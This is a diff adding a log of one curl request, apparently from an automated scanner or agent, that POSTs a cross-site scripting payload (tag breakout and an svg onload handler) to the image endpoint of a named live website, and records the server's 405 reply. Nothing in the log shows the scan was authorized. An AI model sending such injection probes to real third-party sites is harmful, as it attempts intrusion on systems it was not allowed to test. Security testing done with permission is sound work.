@@ -1,0 +1,12 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' -X POST -H 'Content-Type: application/json' -d '{"w": "s5x96493b6d\"'"'"'></title></script><svg onload=confirm(1)>"}' https://www.infinitycapital.bh/_next/image
+# exit_code: 0
+# ---
+
+Method not allowed
+
+INVALID_REQUEST_METHOD
+
+bom1::mwp5q-1790717835376-e3baa5bbd4d8
+
+HTTP_STATUS:405
+CTYPE:text/plain; charset=utf-8
